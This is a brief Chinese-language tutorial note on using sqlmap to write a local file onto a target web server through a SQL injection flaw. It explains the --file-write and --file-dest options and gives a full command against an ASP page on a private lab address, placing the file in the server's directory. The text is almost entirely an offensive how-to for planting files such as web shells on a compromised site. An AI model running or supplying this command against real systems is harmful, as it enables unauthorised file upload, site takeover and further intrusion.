上传自己的文件

在sqlmap目录下新建目录（mst）
在目录（mst）下创建自己想要上传文件

# 本地写入

	--file-write "./mst/mst.txt"  本地文件的路径
	--file-dest "d:/www/1.html"    目标文件路径

	sqlmap -u http://192.168.1.3:8008/onews.asp?id=45 --file-write "./mst/mst.txt" --file-dest "d:/222/1.html"
